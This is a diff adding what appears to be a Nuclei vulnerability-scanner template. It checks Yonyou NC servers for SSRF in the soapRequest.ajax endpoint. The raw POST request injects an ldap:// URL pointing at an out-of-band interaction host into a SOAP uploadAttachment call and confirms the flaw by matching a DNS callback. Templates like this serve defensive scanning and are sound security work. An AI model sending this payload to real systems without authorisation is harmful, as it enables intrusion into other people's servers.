@@ -1,0 +1,35 @@
+id: yongyou-nc-soapRequest-ssrf
+info:
+  name: yongyou-nc-soapRequest-ssrf
+  author: yongyou-nc-soapRequest-ssrf
+
+requests:
+  - raw:
+      - |
+        POST /uapws/soapRequest.ajax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip
+        
+        ws=nc.itf.msgcenter.IMsgCenterWebService&soap=<?xml version="1.0" encoding="UTF-8"?><env:Envelop xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:sn="http://msgcenter.itf.nc/IMsgCenterWebService">
+        <env:Header/>
+        <env:Body>
+        <sn:uploadAttachment>
+        <dataSource>ldap://{{interactsh-url}}/Test</dataSource>
+        <msgtype>?</msgtype>
+        <pk_sourcemsg>?</pk_sourcemsg>
+        <filename>?</filename>
+        <file>?</file>
+        </sn:uploadAttachment>
+        </env:Body>
+        </env:Envelop>
+
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
